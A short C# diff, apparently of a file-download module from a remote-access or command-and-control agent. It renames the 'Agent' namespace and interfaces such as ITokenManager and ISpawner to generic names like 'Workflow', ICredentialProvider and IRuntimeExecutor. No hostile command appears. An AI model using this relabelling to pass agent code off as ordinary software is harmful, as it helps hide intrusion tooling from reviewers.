@@ -1,6 +1,6 @@
-﻿using Agent.Interfaces;
-using Agent.Models;
-using Agent.Utilities;
+using Workflow.Contracts;
+using Workflow.Models;
+using Workflow.Utilities;
 using System;
 using System.Collections.Concurrent;
 using System.Text.Json;
@@ -9,7 +9,7 @@ using System.Globalization;
 using System.Security.Cryptography;
 using System.IO;
 
-namespace Agent
+namespace Workflow
 {
     public class DownloadJsonResponse
     {
@@ -22,16 +22,16 @@ namespace Agent
             return JsonSerializer.Serialize(this);
         }
     }
-    public class Plugin : IFilePlugin
+    public class Plugin : IFileModule
     {
         public string Name => "download";
-        private IMessageManager messageManager { get; set; }
+        private IDataBroker messageManager { get; set; }
         private ILogger logger { get; set; }
-        private ITokenManager tokenManager { get; set; }
-        private IAgentConfig config { get; set; }
+        private ICredentialProvider tokenManager { get; set; }
+        private IServiceConfig config { get; set; }
         private ConcurrentDictionary<string, ServerDownloadJob> downloadJobs { get; set; }
         private Dictionary<string, FileStream> _streams { get; set; }
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
+        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
         {
             this.messageManager = messageManager;
             this.logger = logger;
